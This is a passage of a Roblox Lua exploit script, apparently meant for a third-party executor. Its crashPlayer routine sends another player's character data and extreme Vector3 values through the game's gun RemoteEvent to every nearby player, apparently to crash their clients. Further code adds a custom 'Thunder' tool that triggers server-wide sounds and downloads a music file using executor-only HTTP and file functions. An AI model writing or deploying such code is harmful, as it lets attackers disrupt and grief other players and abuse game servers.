local function crashPlayer(player)
	local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
	if not hrp then return end

	local backpack = LocalPlayer:FindFirstChild("Backpack")
	if not backpack then return end

	local assault = backpack:FindFirstChild("Assault")
	if not assault then return end

	local gunScript = assault:FindFirstChild("GunScript_Local")
	if not gunScript then return end

	local muzzleEffect = gunScript:FindFirstChild("MuzzleEffect")
	local hitEffect = gunScript:FindFirstChild("HitEffect")
	if not muzzleEffect or not hitEffect then return end

	local remote = ReplicatedStorage:FindFirstChild("RE") and ReplicatedStorage.RE:FindFirstChild("1Gu1n")
	if not remote then return end
	
	local args = {
		[1] = hrp,
		[2] = hrp,
		[3] = Vector3.new(100000000376832, 100000000376832, 100000000376832),
		[4] = Vector3.new(8.3, 2.0, -26.3),
		[5] = muzzleEffect,
		[6] = hitEffect,
		[7] = 0,
		[8] = 0,
		[9] = { [1] = false },
		[10] = {
			[1] = 25,
			[2] = Vector3.new(100, 100, 100),
			[3] = BrickColor.new(29),
			[4] = 0.25,
			[5] = Enum.Material.SmoothPlastic,
			[6] = 0.25
		},
		[11] = true,
		[12] = false
	}
	remote:FireServer(unpack(args))
end

task.spawn(function()
	local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local myHRP = myChar:WaitForChild("HumanoidRootPart")

	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			local targetHRP = player.Character.HumanoidRootPart
			if (targetHRP.Position - myHRP.Position).Magnitude <= 100 then
				crashPlayer(player)
				task.wait()
			end
		end
	end
end)
end

local function CreateTool1()
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    local animation = Instance.new("Animation")
    animation.AnimationId = "rbxassetid://95208626840214"

    local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)
    local track = animator:LoadAnimation(animation)

    track.Priority = Enum.AnimationPriority.Action

    local tool = Instance.new("Tool")
    tool.Name = "Thunder"
    tool.RequiresHandle = false
    tool.CanBeDropped = false

    tool.Equipped:Connect(function()
        local args = {
            [1] = workspace,
            [2] = 6802318846,
            [3] = 1
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))

        local SoundService = game:GetService("SoundService")
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://6802318846"
        sound.Volume = 0.5
        sound.PlaybackSpeed = 1
        sound.Parent = SoundService

        track:Play()
        track:AdjustWeight(0.5)
        track:AdjustSpeed(1)

        sound:Play()
        Power()

        task.delay(3, function()
            sound:Stop()
        end)
    end)

    tool.Unequipped:Connect(function()
        track:Stop()
    end)

    tool.Parent = player.Backpack
end

local fileName = "hopesanddreams.mp3"
local soundName = "HopesAndDreams"

local function PlayMusic()
    local existingSound = game.Workspace:FindFirstChild(soundName)
    if existingSound and existingSound:IsA("Sound") then
        return existingSound
    end
    local hasFile = isfile and isfile(fileName)
    if not hasFile then
        local request = syn and syn.request or http_request or fluxus and fluxus.request
        if not request then return end
        local response = request({Url = url, Method = "GET"})
        if response.StatusCode ~= 200 then return end
        writefile(fileName, response.Body)
    end
    local sound = Instance.new("Sound")
    sound.Name = soundName
    sound.SoundId = getsynasset and getsynasset(fileName) or getcustomasset(fileName)
    sound.Volume = getgenv().MusicVolume
    sound.Looped = true
    sound.Parent = game.Workspace
    return sound
end

task.spawn(function()
    local sound = nil
    while true do
        task.wait(1)
        if getgenv().Music then
            if not sound or not sound:IsDescendantOf(game) then
                sound = PlayMusic()
            end
            if sound then
                sound.Volume = getgenv().MusicVolume
                if not sound.IsPlaying then
                    sound.TimePosition = 0
                    sound:Play()
                end
            end
        else
            if sound and sound.IsPlaying then
                sound:Stop()
            end
        end
    end
end)
	end
end)
end
